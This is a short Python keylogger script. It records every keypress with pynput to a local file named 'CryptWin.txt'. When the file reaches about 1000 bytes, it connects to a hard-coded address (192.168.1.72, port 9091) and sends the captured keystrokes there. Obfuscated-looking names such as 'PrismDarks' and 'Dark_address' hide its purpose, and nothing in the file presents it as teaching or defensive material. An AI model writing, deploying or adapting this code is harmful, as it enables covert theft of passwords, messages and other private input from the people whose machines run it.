
import socket,os,sys
from pynput.keyboard import Listener

class keywor0ds_Ward:
     unicodeGlobal = ["UTF-8"]
     
root = "CryptWin.txt"
limit_kilobytes = 1000 # 1kb or 1 kilobyte

Dark_address, tunnel_port = "192.168.1.72",9091

def PrismDarks(keybase):
    kXvmx_Base = str(keybase)
    kXvmx_Base = kXvmx_Base.replace("'","")
    
    cryptData = open(root,"a")
    cryptData.write(kXvmx_Base)
    
    if os.stat(root).st_size >= limit_kilobytes:
        DarkSocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        DarkSocket.connect((Dark_address,tunnel_port))
        with open(root,"r") as rootRead:
            digitalBytes = rootRead.read()
        DarkSocket.send(bytes(digitalBytes.encode(keywor0ds_Ward.unicodeGlobal[0])))

        sys.exit()
    else:
        pass

if __name__ == "__main__":
    with Listener(on_press=PrismDarks) as MultiWriter:
        MultiWriter.join()
